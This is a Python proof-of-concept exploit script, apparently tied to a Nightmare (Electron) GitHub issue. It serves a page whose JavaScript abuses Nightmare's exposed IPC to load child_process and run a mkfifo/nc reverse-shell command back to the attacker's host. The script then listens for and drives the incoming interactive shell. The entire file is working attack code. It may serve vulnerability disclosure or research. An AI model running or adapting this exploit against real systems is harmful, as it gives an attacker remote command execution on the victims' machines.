#!/usr/bin/env python3
#
# https://github.com/segmentio/nightmare/issues/1060
#
import sys
import os
import socket
import http.server

html = """
<!doctype html>
<html>
    <head>
        <meta charset="utf-8">
        <title>nightmarejs</title>
    </head>
    <body>
        <script>
            "use strict";

            function exec() {
                try {
                    var sendSync = __nightmare.ipc.sendSync;
                    if (typeof sendSync !== "function") {
                        return;
                    }
                } catch (e) {
                    return;
                }

                /*
                 * ELECTRON_BROWSER_REQUIRE returns metadata for
                 * module.exports, and the actual object is stored in
                 * the objectsRegistry (see valueToMeta())
                 */
                var proc = sendSync("ELECTRON_BROWSER_REQUIRE", "child_process");

                /*
                 * ELECTRON_BROWSER_MEMBER_CALL retrieves a module object from
                 * the objectsRegistry and calls the specified method with an
                 * array of arguments processed by unwrapArgs()
                 */
                var port = location.port;
                if (port === "") {
                    port = location.protocol === "http:" ? 80 : 443;
                }
                var host = location.hostname + " " + port;
                var args = [{
                    type: "value",
                    value: "rm -f /tmp/fifo" +
                           "; mkfifo /tmp/fifo" +
                           "; cat /tmp/fifo" +
                           "| /bin/sh -i 2>&1" +
                           "| nc " + host + " >/tmp/fifo"
                }];
                sendSync("ELECTRON_BROWSER_MEMBER_CALL", proc.id, "exec", args);
            }

            exec();
        </script>
    </body>
</html>
"""


class Server(http.server.HTTPServer):
    max_packet_size = 8192

    def finish_request(self, request, client_address):
        data = request.recv(self.max_packet_size, socket.MSG_PEEK)
        if len(data) > 0 and data[-1] == ord("\n"):
            self.RequestHandlerClass(request, client_address, self)
            return

        print("=> we may have a shell on %s" % request.getpeername()[0])
        if os.fork():
            while True:
                cmd = sys.stdin.readline()
                request.send(bytes(cmd, "utf-8"))
        else:
            while True:
                res = request.recv(self.max_packet_size)
                sys.stdout.write(str(res, "utf-8"))
                sys.stdout.flush()


class HTTPRequestHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(http.server.HTTPStatus.OK)
        self.send_header("Content-type", "text/html")
        self.send_header("Connection", "close")
        self.end_headers()
        self.wfile.write(bytes(html, "utf-8"))


def main():
    if len(sys.argv) != 2 or ":" not in sys.argv[1]:
        sys.exit("%s host:port" % sys.argv[0])

    addr, port = sys.argv[1].split(":")
    print("listening on %s:%s" % (addr, port))
    server = Server((addr, int(port)), HTTPRequestHandler)
    server.serve_forever()


if __name__ == "__main__":
    main()
